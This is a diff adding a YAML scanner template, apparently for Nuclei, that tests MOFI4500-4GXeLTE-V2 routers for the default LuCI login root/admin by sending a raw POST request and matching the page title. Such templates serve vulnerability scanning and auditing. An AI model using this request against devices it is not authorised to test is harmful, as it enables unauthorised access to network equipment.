@@ -1,0 +1,32 @@
+id: mofi4500-default-login
+info:
+  author: pikpikcu
+  name: MOFI4500-4GXeLTE-V2 Default Login
+  severity: critical
+  tags: mofi,default-login
+requests:
+- attack: pitchfork
+  matchers:
+  - type: word
+    words:
+    - MOFI4500 - General - LuCI
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    password:
+    - admin
+    username:
+    - root
+  raw:
+  - 'POST /cgi-bin/luci/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    username=root&password=admin
+
+    '
